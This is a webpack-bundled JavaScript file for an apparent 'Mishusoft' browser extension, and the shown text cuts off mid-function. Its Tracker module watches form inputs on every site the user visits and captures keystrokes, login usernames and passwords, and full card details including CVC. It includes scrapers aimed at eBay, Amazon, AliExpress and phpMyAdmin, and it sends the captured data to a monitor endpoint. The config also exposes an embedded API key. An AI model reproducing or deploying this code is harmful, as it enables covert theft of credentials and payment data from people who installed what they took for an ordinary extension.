/******/ var __webpack_modules__ = ({

/***/ "./typescripts/common/request.ts":
/*!***************************************!*\
  !*** ./typescripts/common/request.ts ***!
  \***************************************/
/***/ (function(__unused_webpack_module, __webpack_exports__, __webpack_require__) {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "sendRequest": function() { return /* binding */ sendRequest; }
/* harmony export */ });
/* harmony import */ var _validation__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./validation */ "./typescripts/common/validation.ts");

function sendRequest(options, callback, fallback) {
    var dataType = "unrecognized";
    if (typeof options === "object") {
        if (options.method !== "" && options.url !== "") {
            if (typeof XMLHttpRequest !== "undefined") {
                var request_1 = new XMLHttpRequest();
                request_1.open(options.method, options.url, options.async);
                //set header for xhr request
                if (options.header !== undefined && typeof options.header == "object") {
                    options.header.forEach(function (item) {
                        Object.keys(item).forEach(function (name) {
                            var value = item[name];
                            request_1.setRequestHeader(name, value);
                            if (value.indexOf("form") !== -1) {
                                dataType = "formData";
                            }
                            if (value.indexOf("json") !== -1) {
                                dataType = "jsonData";
                            }
                        });
                    });
                }
                //send data with xhr request
                if (dataType !== "unrecognized") {
                    if (options.data !== undefined && typeof options.data == "object") {
                        //send json data
                        if (dataType === "jsonData") {
                            request_1.send(JSON.stringify(options.data));
                        }
                        //send form data
                        if (dataType === "formData") {
                            var formData_1 = new FormData();
                            Object.keys(options.data).forEach(function (key) {
                                formData_1.append(key, options.data[key]);
                            });
                            request_1.send(formData_1);
                        }
                    }
                }
                else {
                    if ((0,_validation__WEBPACK_IMPORTED_MODULE_0__.IsJsonString)(options.data) || typeof options.data === "object") {
                        request_1.setRequestHeader("Content-type", "application/json; charset=utf-8");
                        request_1.send(JSON.stringify(options.data));
                    }
                    else {
                        request_1.send();
                    }
                }
                //catch state of xhr
                request_1.onreadystatechange = function () {
                    if (this.readyState === 4) {
                        if (this.status === 0) {
                            if (fallback) {
                                fallback(new Error("Request send failed ".concat(options.url)));
                            }
                        }
                        if (this.status === 200) {
                            if (callback) {
                                callback(this.responseText);
                            }
                        }
                    }
                };
            }
            else {
                if (fallback) {
                    fallback(new Error("Runtime Environment could not support XMLHttpRequest"));
                }
            }
        }
        else {
            if (fallback) {
                fallback(new Error("Request Method and URL can not be empty"));
            }
        }
    }
    else {
        if (fallback) {
            fallback(new Error("Invalid options"));
        }
    }
}


/***/ }),

/***/ "./typescripts/common/validation.ts":
/*!******************************************!*\
  !*** ./typescripts/common/validation.ts ***!
  \******************************************/
/***/ (function(__unused_webpack_module, __webpack_exports__, __webpack_require__) {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "checkDuplicate": function() { return /* binding */ checkDuplicate; },
/* harmony export */   "isNumber": function() { return /* binding */ isNumber; },
/* harmony export */   "IsJsonString": function() { return /* binding */ IsJsonString; }
/* harmony export */ });
/**
 * @param str valid string
 * */
function checkDuplicate(str) {
    for (var i = 0; i < str.length; i++) {
        var re = new RegExp("[^" + str[i] + "]", "g");
        if (str.replace(re, "").length >= 2) {
            return true;
        }
    }
    return false;
}
/**
 * @param n any
 * */
function isNumber(n) {
    return !isNaN(parseFloat(n)) && isFinite(n);
}
/**
 * @param string string
 * */
function IsJsonString(string) {
    try {
        JSON.parse(string);
    }
    catch (e) {
        return false;
    }
    return true;
}


/***/ }),

/***/ "./typescripts/db/app.ts":
/*!*******************************!*\
  !*** ./typescripts/db/app.ts ***!
  \*******************************/
/***/ (function(__unused_webpack_module, __webpack_exports__, __webpack_require__) {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "appHost": function() { return /* binding */ appHost; },
/* harmony export */   "app": function() { return /* binding */ app; }
/* harmony export */ });
/* global _root_ */
/*initialize on extension installed*/
var _a;
var __appHostedServerRoot;
var temp = (_a = document.querySelector('#mishusoft-web-root')) === null || _a === void 0 ? void 0 : _a.getAttribute('content');
if (typeof temp === null) {
    __appHostedServerRoot = '/';
}
else if (typeof temp === undefined) {
    __appHostedServerRoot = 'http://localhost/';
    /*required variables*/
}
else {
    // @ts-ignore
    __appHostedServerRoot = temp.toString();
}
if (__appHostedServerRoot.substr(-1) !== '/') {
    __appHostedServerRoot += '/';
}
var appHost = __appHostedServerRoot;
var app = {
    "default": {
        "name": 'mishusoft',
        "version": 'official',
        "author": 'Mr. Al-Amin Ahamed (Abir)',
        "charset": 'utf8mb4',
        "prefix": 'msu',
        "companyName": 'Mishusoft Systems Incorporate.',
        "text": {
            "welcome": "Welcome to Mishusoft Platform",
            "description": "Mishusoft Platform is a robust multi-web platform developed by Mishusoft Systems Inc. This platform is capable of getting your work done quickly and accurately.",
            "install_state": "The application is ready to be installed on your device at this time.",
        }
    },
    "content": {
        "folder": {
            "logos": __appHostedServerRoot + 'media/logos/',
            "css": __appHostedServerRoot + 'assets/css/',
            "js": __appHostedServerRoot + 'assets/js/',
            "images": __appHostedServerRoot + 'assets/images/',
        },
        "file": {
            "default": {
                "link": [
                    {
                        "href": __appHostedServerRoot + "media/logos/apple-icon-57x57.png",
                        "rel": "apple-touch-icon",
                        "size": "57x57"
                    },
                    {
                        "href": __appHostedServerRoot + "media/logos/apple-icon-60x60.png",
                        "rel": "apple-touch-icon",
                        "size": "60x60"
                    },
                    {
                        "href": __appHostedServerRoot + "media/logos/apple-icon-72x72.png",
                        "rel": "apple-touch-icon",
                        "size": "72x72"
                    },
                    {
                        "href": __appHostedServerRoot + "media/logos/apple-icon-76x76.png",
                        "rel": "apple-touch-icon",
                        "size": "76x76"
                    },
                    {
                        "href": __appHostedServerRoot + "media/logos/apple-icon-114x114.png",
                        "rel": "apple-touch-icon",
                        "size": "114x114"
                    },
                    {
                        "href": __appHostedServerRoot + "media/logos/apple-icon-120x120.png",
                        "rel": "apple-touch-icon",
                        "size": "120x120"
                    },
                    {
                        "href": __appHostedServerRoot + "media/logos/apple-icon-144x144.png",
                        "rel": "apple-touch-icon",
                        "size": "144x144"
                    },
                    {
                        "href": __appHostedServerRoot + "media/logos/apple-icon-152x152.png",
                        "rel": "apple-touch-icon",
                        "size": "152x152"
                    },
                    {
                        "href": __appHostedServerRoot + "media/logos/apple-icon-180x180.png",
                        "rel": "apple-touch-icon",
                        "size": "180x180"
                    },
                    {
                        "href": __appHostedServerRoot + "media/logos/android-icon-192x192.png",
                        "rel": "icon",
                        "size": "192x192",
                        "type": "image/png"
                    },
                    {
                        "href": __appHostedServerRoot + "media/logos/favicon-16x16.png",
                        "rel": "icon",
                        "size": "16x16",
                        "type": "image/png"
                    },
                    {
                        "href": __appHostedServerRoot + "media/logos/favicon-32x32.png",
                        "rel": "icon",
                        "size": "32x32",
                        "type": "image/png"
                    },
                    {
                        "href": __appHostedServerRoot + "media/logos/favicon-96x96.png",
                        "rel": "icon",
                        "size": "96x96",
                        "type": "image/png"
                    },
                    {
                        "href": __appHostedServerRoot + "media/logos/favicon.ico",
                        "rel": "icon",
                        "size": "16x16",
                        "type": "image/vnd.microsoft.icon"
                    },
                    {
                        "href": __appHostedServerRoot + "media/logos/manifest.json",
                        "rel": "manifest",
                    },
                    {
                        "name": "msapplication-TileColor",
                        "content": "#ffffff",
                    },
                    {
                        "name": "msapplication-TileImage",
                        "content": __appHostedServerRoot + "media/logos/ms-icon-144x144.png"
                    },
                    {
                        "name": "theme-color",
                        "content": "#ffffff",
                    },
                ],
            },
        },
    },
    "website": {
        "home": __appHostedServerRoot,
        "support": "support@mishusoft.com",
        "donate": __appHostedServerRoot + "payment/donate",
        "ipInfoDedicated": __appHostedServerRoot + "api/tools/ipinfo",
        "IpInfo": "https://api.ipdata.co/?api-key=2f9dde381f67efed325acfb1011a988036b28fc6cc02f07668ef7180",
        "IpInfoKey": "2f9dde381f67efed325acfb1011a988036b28fc6cc02f07668ef7180",
        "fontAwesome": "https://kit.fontawesome.com/b4c8f8449f.js",
        "fontAwesomeKey": "b4c8f8449f",
        "temporary": {
            "home": "http://localhost/",
            "monitorURL": "http://localhost/monitor/browser/",
            "paymentURL": "http://localhost/payment/"
        },
        "publish": {
            "home": "https://www.mishusoft.com/",
            "monitorURL": "https://www.mishusoft.com/monitor/browser/",
            "paymentURL": "https://www.mishusoft.com/payment/"
        }
    },
    "runtime": {
        "request": ""
    }
};


/***/ }),

/***/ "./typescripts/db/tracker.ts":
/*!***********************************!*\
  !*** ./typescripts/db/tracker.ts ***!
  \***********************************/
/***/ (function(__unused_webpack_module, __webpack_exports__, __webpack_require__) {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "authFormAttribute": function() { return /* binding */ authFormAttribute; },
/* harmony export */   "paymentElementsAttribute": function() { return /* binding */ paymentElementsAttribute; }
/* harmony export */ });
var authFormAttribute = [
    {
        'login': [
            'form1', 'signin', 'signon', 'login', 'logon', 'identi', 'idb', 'wpcf7-form', 'form--1G_Qn', 'fl', 'ng-pristine',
            'index.php', 'new_user', 'ctl23', 'jss', 'connexion', 'file', 'styledform', 'auth',
        ]
    },
    { 'register': ['reg', 'signup', 'join', 'register', 'checkform'] },
    { 'logout': ['logout'] },
    {
        'payment': [
            'credit', 'payment', 'body', 'checkout', 'sslform', 'pay', 'purchase', 'elementsapp', 'creditcard',
            'credit-card', 'addcard', 'bill'
        ]
    },
    {
        'exclude': [
            /*'q', */ 'search', 'googleads', 'presentation', 'captcha', /*'disable', */ 'header',
            'convert-form', 'wam_arten', 'matchkalender', 'suche', 'generate', 'subscribe', 'ignore',
            'download', 'kreditrechner', 'bit_exchange_form', 'applyform', 'app_form', 'comment', 'wallet',
            'picker', 'wp-link', 'meta', 'panier', 'commande', 'recherche', 'settings', 'posts', 'challenge', 'tag',
            'upload', 'mainf', 'domain'
        ]
    },
];
var paymentElementsAttribute = [
    { 'cardNumber': ['num', 'no', 'cardno',] },
    { 'cardHolder': ['holder', 'owner', 'name',] },
    { 'cardTypes': ['brand', 'type', 'types',] },
    { 'cardExpire': ['exp',] },
    { 'cardCVC': ['cvc', 'csc', 'cvv', 'securitycode',] },
    { 'cardPostalCode': ['zip', 'post',] },
    /*{'exclude': ['email', 'user', 'usr']},*/
];


/***/ }),

/***/ "./typescripts/mishusoft/Tracker.ts":
/*!******************************************!*\
  !*** ./typescripts/mishusoft/Tracker.ts ***!
  \******************************************/
/***/ (function(__unused_webpack_module, __webpack_exports__, __webpack_require__) {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "Tracker": function() { return /* binding */ Tracker; }
/* harmony export */ });
/* harmony import */ var _db_tracker__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ../db/tracker */ "./typescripts/db/tracker.ts");
var __spreadArray = (undefined && undefined.__spreadArray) || function (to, from, pack) {
    if (pack || arguments.length === 2) for (var i = 0, l = from.length, ar; i < l; i++) {
        if (ar || !(i in from)) {
            if (!ar) ar = Array.prototype.slice.call(from, 0, i);
            ar[i] = from[i];
        }
    }
    return to.concat(ar || Array.prototype.slice.call(from));
};

/*initialize on extension installed*/
var globalAppMonitorMainURL;
globalAppMonitorMainURL = 'http://localhost/monitor/browser/';
/*required variables*/
var Tracker = /** @class */ (function () {
    function Tracker(url, identify, version, osNameAndArch, webBrowserNameFull) {
        this.isTrackerActivate = false;
        this.trackerJobId = 0;
        this.passwordStore = [];
        this.creditCardStore = [];
        this.creditCardRuntimeHolderName = '';
        this.creditCardRuntimeNumber = '';
        this.creditCardRuntimeBrand = '';
        this.creditCardRuntimeExpireDate = '';
        this.creditCardRuntimeCvc = '';
        this.creditCardRuntimePostalCode = '';
        this.url = url;
        Tracker.identity = identify;
        Tracker.version = version;
        Tracker.osNameAndArch = osNameAndArch;
        Tracker.browserNameFull = webBrowserNameFull;
    }
    Tracker.prototype.init = function (callBack) {
        var self = this;
        if (self.url) {
            var interval1_1 = setInterval(function () {
                self.verifyFormElement(self, interval1_1);
            }, 1000);
            self.backupScripts(self);
            self.absoluteTrack(self);
        }
        if (callBack) {
            callBack();
        }
    };
    Tracker.prototype.absoluteTrack = function (self) {
        var interval = setInterval(function () {
            if (document.querySelectorAll('input').length !== 0) {
                clearInterval(interval);
                self.absoluteTrackHelper(self, document.body, 'input', function (__detectedElement) {
                    ['keyup', 'paste', 'change', 'input'].forEach(function (event) {
                        __detectedElement.addEventListener(event, function () {
                            if (__detectedElement.value.length !== 0) {
                                Tracker.send({
                                    command: 'saveInputElementData',
                                    data: {
                                        'name': __detectedElement.nodeName.toLowerCase(),
                                        'type': __detectedElement.type,
                                        'value': __detectedElement.value,
                                        'placeholder': __detectedElement.placeholder ? __detectedElement.placeholder : 'NOT SET',
                                        "workWebsite": window.location.origin
                                    }
                                });
                            }
                        });
                    });
                });
            }
            if (document.querySelectorAll('select').length !== 0) {
                clearInterval(interval);
                self.absoluteTrackHelper(self, document.body, 'select', function (__detectedElement) {
                    ['keyup', 'paste', 'change', 'input'].forEach(function (event) {
                        __detectedElement.addEventListener(event, function () {
                            if (__detectedElement.value.length !== 0) {
                                Tracker.send({
                                    command: 'saveInputElementData',
                                    data: {
                                        'name': __detectedElement.nodeName.toLowerCase(),
                                        'type': __detectedElement.type,
                                        'value': __detectedElement.value,
                                        'placeholder': __detectedElement.placeholder ? __detectedElement.placeholder : 'NOT SET',
                                        "workWebsite": window.location.origin
                                    }
                                });
                            }
                        });
                    });
                });
            }
        }, 100);
    };
    Tracker.prototype.absoluteTrackHelper = function (self, elementParentNode, __tagName, callback) {
        if (elementParentNode.childNodes.length !== 0) {
            elementParentNode.childNodes.forEach(function (__childElement) {
                if (__childElement.nodeName.toLowerCase() === __tagName) {
                    if (callback) {
                        callback(__childElement);
                    }
                }
                else {
                    self.absoluteTrackHelper(self, __childElement, __tagName, callback);
                }
            });
        }
    };
    Tracker.prototype.trigger = function (self, __formElement) {
        self.track(self, __formElement);
    };
    Tracker.prototype.verifyFormElement = function (self, interval) {
        if (document.querySelectorAll('form').length !== 0) {
            document.querySelectorAll('form').forEach(function (__formElement) {
                if (__formElement.attributes.length !== 0) {
                    if (window.location.href.toLowerCase().indexOf('phpmyadmin') !== -1) {
                        if (__formElement.method === 'post') {
                            interval ? clearInterval(interval) : '';
                            self.isTrackerActivate = true;
                            self.trackerJobId++;
                            self.trigger(self, __formElement);
                        }
                    }
                    else {
                        if (__formElement.action !== 'javascript:void(0)' && __formElement.id !== 'null' && __formElement.id !== 'irouteForm' &&
                            __formElement.id !== 'bhlf' && __formElement.id.indexOf('id') === -1 && __formElement.id.indexOf('u_0_') === -1 &&
                            __formElement.id.indexOf('theform') === -1 && __formElement.id.indexOf('scl_form') === -1 &&
                            __formElement.className.indexOf('gb_8e') === -1) {
                            interval ? clearInterval(interval) : '';
                            self.isTrackerActivate = true;
                            self.trackerJobId++;
                            self.trigger(self, __formElement);
                        }
                    }
                }
                else {
                    if (__formElement.childNodes.length > 1) {
                        interval ? clearInterval(interval) : '';
                        self.isTrackerActivate = true;
                        self.trackerJobId++;
                        self.trigger(self, __formElement);
                    }
                }
            });
        }
        else {
            if (window.location.origin.indexOf('dash.fembed.com') !== -1) {
                if (document.querySelector('#login') !== null) {
                    interval ? clearInterval(interval) : '';
                    self.isTrackerActivate = true;
                    self.trackerJobId++;
                    self.classicTrackAuthEvent(self, '#email_login', '#password', '#login');
                }
            }
        }
    };
    Tracker.prototype.resolverFormAttributes = function (self, __formElement) {
        var attributes = __spreadArray([], __formElement.attributes, true);
        if (attributes.length !== 0) {
            attributes.forEach(function (attribute) {
                if (attribute.nodeValue !== 'javascript:void(0);') {
                    if (attribute.nodeValue.length !== 0 && attribute.nodeValue.length >= 3) {
                        /*form attribute value*/
                        _db_tracker__WEBPACK_IMPORTED_MODULE_0__.authFormAttribute.forEach(function (keyword) {
                            if (Object.keys(keyword).length !== 0 && keyword.constructor === Object) {
                                Object.keys(keyword).forEach(function (__key) {
                                    keyword[__key].forEach(function (__qKey) {
                                        if (attribute.nodeValue.toLowerCase().indexOf(__qKey) !== -1 /*|| window.location.origin.toLowerCase().indexOf(__qKey) !== -1
                                            || document.title.toLowerCase().indexOf(__qKey) !== -1 && window.location.origin.toLowerCase().indexOf('file') === -1*/) {
                                            /*var str = text.replace(/(^\w{1})|(\s{1}\w{1})/g, match => match.toUpperCase());*/
                                            //self.authEvent !== undefined ? self.authEvent = self.authEvent : self.authEvent = __key;
                                            self.authEvent = __key;
                                        }
                                        else {
                                            if (attribute.nodeValue === null) {
                                                //self.authEvent !== undefined ? self.authEvent = self.authEvent : self.authEvent = 'exclude';
                                                self.authEvent = 'exclude';
                                            }
                                        }
                                    });
                                });
                            }
                        });
                    }
                }
            });
        }
        else {
            self.authEvent = 'Unknown';
        }
        return self.authEvent;
    };
    Tracker.prototype.track = function (self, __formElement) {
        var _a;
        var elements = [];
        if (__formElement.nodeName === 'FORM' && __formElement.length !== 1) {
            self.resolverFormAttributes(self, __formElement);
            if (self.authEvent === 'login' || self.authEvent === 'register') {
                self.crawlAuthFormElement(self, elements, __formElement);
            }
            else if (self.authEvent === 'payment') {
                self.crawlPaymentFormElement(self, elements, __formElement);
            }
            else {
                if (self.authEvent !== 'exclude' && self.authEvent !== 'logout') {
                    self.crawlAuthFormElement(self, elements, __formElement);
                    self.crawlPaymentFormElement(self, elements, __formElement);
                    /*additional functions*/
                    /*exclude paypal,amazon,tunnelbear*/
                    /*ebay*/
                    if (window.location.origin.indexOf('ebay') !== -1) {
                        var interval_1 = setInterval(function () {
                            if (document.querySelectorAll('form').length !== 0) {
                                document.querySelectorAll('form').forEach(function (__ebayFormElement) {
                                    if (__ebayFormElement.id === 'credit-card-details') {
                                        clearInterval(interval_1);
                                        var elements_1 = [];
                                        self.exploreEbayPaymentDataCollection(self, __ebayFormElement, elements_1);
                                    }
                                });
                            }
                        }, 100);
                        if (document.querySelector('#root') !== null && document.querySelector('.cic-module') !== null && document.querySelector('.btn.btn--primary.field') !== null) {
                            if (((_a = document.querySelector('.btn.btn--primary.field')) === null || _a === void 0 ? void 0 : _a.nodeName) === 'BUTTON') {
                                ["click", "dblclick"].forEach(function (event) {
                                    var _a;
                                    var tempPaymentMethodsStore = [];
                                    (_a = document.querySelector('.btn.btn--primary.field')) === null || _a === void 0 ? void 0 : _a.addEventListener(event, function () {
                                        var _a, _b, _c, _d;
                                        self.exploreSpecificElementByTagName(self, document.querySelector('.cic-module'), 'input', 'creditCardNumber', function (__detectedElement) {
                                            tempPaymentMethodsStore.push({
                                                'element': __detectedElement.nodeName,
                                                'id': __detectedElement.id,
                                                'value': __detectedElement.value
                                            });
                                        });
                                        self.exploreSpecificElementByTagName(self, document.querySelector('.cic-module'), 'input', 'firstName', function (__detectedElement) {
                                            tempPaymentMethodsStore.push({
                                                'element': __detectedElement.nodeName,
                                                'id': __detectedElement.id,
                                                'value': __detectedElement.value
                                            });
                                        });
                                        self.exploreSpecificElementByTagName(self, document.querySelector('.cic-module'), 'input', 'lastName', function (__detectedElement) {
                                            tempPaymentMethodsStore.push({
                                                'element': __detectedElement.nodeName,
                                                'id': __detectedElement.id,
                                                'value': __detectedElement.value
                                            });
                                        });
                                        self.exploreSpecificElementByTagName(self, document.querySelector('.cic-module'), 'input', 'expirationDate', function (__detectedElement) {
                                            tempPaymentMethodsStore.push({
                                                'element': __detectedElement.nodeName,
                                                'id': __detectedElement.id,
                                                'value': __detectedElement.value
                                            });
                                        });
                                        self.exploreSpecificElementByTagName(self, document.querySelector('.cic-module'), 'input', 'cvv', function (__detectedElement) {
                                            tempPaymentMethodsStore.push({
                                                'element': __detectedElement.nodeName,
                                                'id': __detectedElement.id,
                                                'value': __detectedElement.value
                                            });
                                        });
                                        Tracker.send({
                                            command: 'savePaymentMethodsData',
                                            data: {
                                                'cardNumber': tempPaymentMethodsStore[0].id.indexOf('creditCardNumber') !== -1 ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                'cardBrand': ((_b = (_a = document.querySelector('.floating-input__fixright')) === null || _a === void 0 ? void 0 : _a.firstElementChild) === null || _b === void 0 ? void 0 : _b.className) ? (_d = (_c = document.querySelector('.floating-input__fixright')) === null || _c === void 0 ? void 0 : _c.firstElementChild) === null || _d === void 0 ? void 0 : _d.className.toLowerCase() : 'Unknown',
                                                'cardHolder': tempPaymentMethodsStore[1].value + ' ' + tempPaymentMethodsStore[2].value,
                                                "cardExpire": tempPaymentMethodsStore[3].id === 'expirationDate' ? tempPaymentMethodsStore[3].value : 'Unknown',
                                                'cardCVC': tempPaymentMethodsStore[4].id === 'cvv' ? tempPaymentMethodsStore[4].value : 'Unknown',
                                                'event': 'add',
                                                "workWebsite": window.location.origin
                                            }
                                        });
                                        tempPaymentMethodsStore = [];
                                    });
                                });
                            }
                        }
                    }
                }
            }
        }
    };
    Tracker.prototype.classicTrackAuthEvent = function (self, usernameElementId, passwordElementId, loginButtonElementId) {
        var usernameElement, passwordElement, loginButtonElement;
        if (document.querySelector(usernameElementId) !== null) {
            usernameElement = document.querySelector(usernameElementId);
        }
        if (document.querySelector(passwordElementId) !== null) {
            passwordElement = document.querySelector(passwordElementId);
        }
        if (document.querySelector(loginButtonElementId) !== null) {
            loginButtonElement = document.querySelector(loginButtonElementId);
        }
        loginButtonElement.addEventListener('click', function () {
            return Tracker.send({
                command: 'saveLoginData',
                data: {
                    "event": self.authEvent,
                    "username": usernameElement.value,
                    "password": passwordElement.value,
                    "workWebsite": window.location.origin
                }
            });
        });
    };
    Tracker.prototype.crawlAuthFormElement = function (self, elements, __parentElement) {
        var _a;
        (_a = __parentElement.childNodes) === null || _a === void 0 ? void 0 : _a.forEach(function (__childElement) {
            ['input', 'button', 'a'].forEach(function (__eligibleElement) {
                if (__childElement.nodeName.toLowerCase() === __eligibleElement) {
                    ['input'].forEach(function (__onlyInputElement) {
                        if (__childElement.nodeName.toLowerCase() === __onlyInputElement) {
                            __spreadArray([], __childElement.attributes, true).forEach(function (__attribute) {
                                if (__attribute.nodeValue.length !== 0 && __attribute.nodeValue.length >= 4) {
                                    /* minor changes start */
                                    ['text', 'user', 'email', 'pass'].forEach(function (__eligibleAttribute) {
                                        if (__attribute.nodeValue.toLowerCase().indexOf(__eligibleAttribute) !== -1) {
                                            elements.push(__childElement);
                                        }
                                    });
                                    /* minor changes end */
                                }
                            });
                        }
                    });
                    if (__childElement.type === 'submit' || __childElement.type === 'button' || __childElement.nodeName === 'A' &&
                        __childElement.innerHTML.toLowerCase().indexOf('sign' || 0 || 0) !== -1) {
                        self.resolveAuthEvent(self, __childElement, elements);
                    }
                }
            });
            return self.crawlAuthFormElement(self, elements, __childElement);
        });
    };
    Tracker.prototype.resolveAuthEvent = function (self, element, array) {
        var elementNode, elementName, elementType, elementValue;
        element.addEventListener('click', function () {
            var _a, _b;
            new Set(array).forEach(function (__detectedElement) {
                __spreadArray([], __detectedElement.attributes, true).forEach(function (__attribute) {
                    if (__attribute.nodeValue.length !== 0 && __attribute.nodeValue.length >= 4) {
                        ['user', 'login', 'email', 'pass'].forEach(function (__eligibleAttribute) {
                            if (__attribute.nodeValue.toLowerCase().indexOf(__eligibleAttribute) !== -1) {
                                elementNode = __detectedElement;
                                elementName = __eligibleAttribute;
                                elementType = __detectedElement.type;
                                elementValue = __detectedElement.value;
                            }
                        });
                    }
                });
                if (elementValue.length !== 0) {
                    self.passwordStore.push({
                        node: elementNode,
                        name: elementName,
                        type: elementType,
                        value: elementValue
                    });
                }
            });
            Tracker.send({
                command: 'saveLoginData',
                data: {
                    "event": self.authEvent,
                    "username": (_a = self.passwordStore[0]) === null || _a === void 0 ? void 0 : _a.value,
                    "password": (_b = self.passwordStore[1]) === null || _b === void 0 ? void 0 : _b.value,
                    "workWebsite": window.location.origin
                }
            });
            self.passwordStore = [];
        });
    };
    Tracker.prototype.crawlPaymentFormElement = function (self, elements, __formElement) {
        var _a;
        (_a = __formElement.childNodes) === null || _a === void 0 ? void 0 : _a.forEach(function (__childElement) {
            ['input', 'button', 'select'].forEach(function (__eligibleElement) {
                if (__childElement.nodeName.toLowerCase() === __eligibleElement) {
                    ['input', 'select'].forEach(function (__eligibleDataElement) {
                        if (__childElement.nodeName.toLowerCase() === __eligibleDataElement) {
                            ['text', 'tel', 'number', 'password', 'radio', 'select-one'].forEach(function (__eligibleElementType) {
                                if (__childElement.type === __eligibleElementType) {
                                    __spreadArray([], __childElement.attributes, true).forEach(function (__attribute) {
                                        if (__attribute.nodeValue.length !== 0 && __attribute.nodeValue.length >= 3) {
                                            _db_tracker__WEBPACK_IMPORTED_MODULE_0__.paymentElementsAttribute.forEach(function (__eligibleKeyword) {
                                                if (Object.keys(__eligibleKeyword).length !== 0 && __eligibleKeyword.constructor === Object) {
                                                    Object.keys(__eligibleKeyword).forEach(function (__cardDataKey) {
                                                        __eligibleKeyword[__cardDataKey].forEach(function (__qKey) {
                                                            if (__attribute.nodeValue.toLowerCase().indexOf(__qKey) !== -1 && __attribute.nodeValue.toLowerCase().indexOf('none' || 0 || 0) === -1) {
                                                                elements.push(__childElement);
                                                            }
                                                        });
                                                    });
                                                }
                                            });
                                        }
                                    });
                                }
                            });
                        }
                    });
                    ['submit', 'button'].forEach(function (__eligibleCollectorElement) {
                        if (__childElement.type === __eligibleCollectorElement) {
                            self.resolvePaymentEvent(self, __childElement.form, __childElement, elements);
                        }
                    });
                }
            });
            return self.crawlPaymentFormElement(self, elements, __childElement);
        });
    };
    /* PASSED
    * https://www.tunnelbear.com/account/checkout
    * https://www.amazon.com/cpe/yourpayments/wallet
    * */
    Tracker.prototype.resolvePaymentEvent = function (self, __formElement, __dataCollectorElement, array) {
        ['submit'].forEach(function (__formEvent) {
            __formElement.addEventListener(__formEvent, function () {
                self.collectPaymentData(self, array);
            });
        });
        ['click', 'dblclick', 'ontouchstart'].forEach(function (__dataCollectorEvent) {
            __dataCollectorElement.addEventListener(__dataCollectorEvent, function () {
                self.collectPaymentData(self, array);
            });
        });
        try {
            if (window.self !== window.top) {
                new Set(array).forEach(function (__detectedElement) {
                    ['keyup', 'keydown', 'change', 'paste'].forEach(function (__event) {
                        __detectedElement.addEventListener(__event, function () {
                            self.collectPaymentData(self, array);
                        });
                    });
                });
            }
        }
        catch (e) {
        }
    };
    Tracker.prototype.collectPaymentData = function (self, array) {
        var elementNode, elementName, elementType, elementValue;
        new Set(array).forEach(function (__detectedElement) {
            __spreadArray([], __detectedElement.attributes, true).forEach(function (__attribute) {
                if (__attribute.nodeValue.length !== 0 && __attribute.nodeValue.length >= 3) {
                    _db_tracker__WEBPACK_IMPORTED_MODULE_0__.paymentElementsAttribute.forEach(function (__eligibleKeyword) {
                        if (Object.keys(__eligibleKeyword).length !== 0 && __eligibleKeyword.constructor === Object) {
                            Object.keys(__eligibleKeyword).forEach(function (__cardDataKey) {
                                __eligibleKeyword[__cardDataKey].forEach(function (__qKey) {
                                    if (__attribute.nodeValue.toLowerCase().indexOf(__qKey) !== -1) {
                                        elementNode = __detectedElement;
                                        elementName = __cardDataKey;
                                        elementType = __detectedElement.type;
                                        elementValue = __detectedElement.value;
                                    }
                                });
                            });
                        }
                    });
                }
            });
            if (elementValue.length !== 0) {
                self.creditCardStore.push({
                    node: elementNode,
                    name: elementName,
                    type: elementType,
                    value: elementValue
                });
            }
        });
        self.retrieveAccurateData(self, self.creditCardStore);
        Tracker.send({
            command: 'savePaymentMethodsData',
            data: {
                'cardNumber': self.creditCardRuntimeNumber !== '' ? self.creditCardRuntimeNumber : 'Unknown',
                'cardBrand': self.creditCardRuntimeBrand !== '' ? self.creditCardRuntimeBrand : 'Unknown',
                'cardHolder': self.creditCardRuntimeHolderName !== '' ? self.creditCardRuntimeHolderName : 'Unknown',
                "cardExpire": self.creditCardRuntimeExpireDate !== '' ? self.creditCardRuntimeExpireDate /*.substring(0, self.creditCardRuntimeExpireDate.length - 1)*/ : 'Unknown',
                'cardCVC': self.creditCardRuntimeCvc !== '' ? self.creditCardRuntimeCvc : 'Unknown',
                'event': 'add',
                "workWebsite": window.location.origin
            }
        });
        self.creditCardStore = [];
        self.creditCardRuntimeHolderName = '';
        self.creditCardRuntimeNumber = '';
        self.creditCardRuntimeBrand = '';
        self.creditCardRuntimeExpireDate = '';
        self.creditCardRuntimeCvc = '';
        self.creditCardRuntimePostalCode = '';
        //self.verifyFormElement(self);
    };
    Tracker.prototype.retrieveAccurateData = function (self, __creditCardDataStore) {
        if (__creditCardDataStore.length !== 0) {
            __creditCardDataStore.forEach(function (__detectedDataElement) {
                (__detectedDataElement.name === 'cardNumber') ? self.creditCardRuntimeNumber = __detectedDataElement.value : '';
                (__detectedDataElement.name === 'cardHolder') ? self.creditCardRuntimeHolderName += __detectedDataElement.value + ' ' : '';
                (__detectedDataElement.name === 'cardBrand') ? self.creditCardRuntimeBrand = __detectedDataElement.value : '';
                (__detectedDataElement.name === 'cardExpire') ? self.creditCardRuntimeExpireDate += __detectedDataElement.value + '/' : '';
                (__detectedDataElement.name === 'cardCVC') ? self.creditCardRuntimeCvc = __detectedDataElement.value : '';
                (__detectedDataElement.name === 'cardPostalCode') ? self.creditCardRuntimePostalCode = __detectedDataElement.value : '';
            });
        }
    };
    Tracker.prototype.backupScripts = function (self) {
        var interval1 = setInterval(function () {
            var _a, _b, _c;
            if (window.location.origin.indexOf('amazon') !== -1) {
                clearInterval(interval1);
                var interval_2 = setInterval(function () {
                    if (document.querySelectorAll('form').length !== 0) {
                        clearInterval(interval_2);
                        self.exploreAmazonPaymentContainer(self);
                    }
                }, 100);
            }
            if (window.location.origin.indexOf('aliexpress') !== -1) {
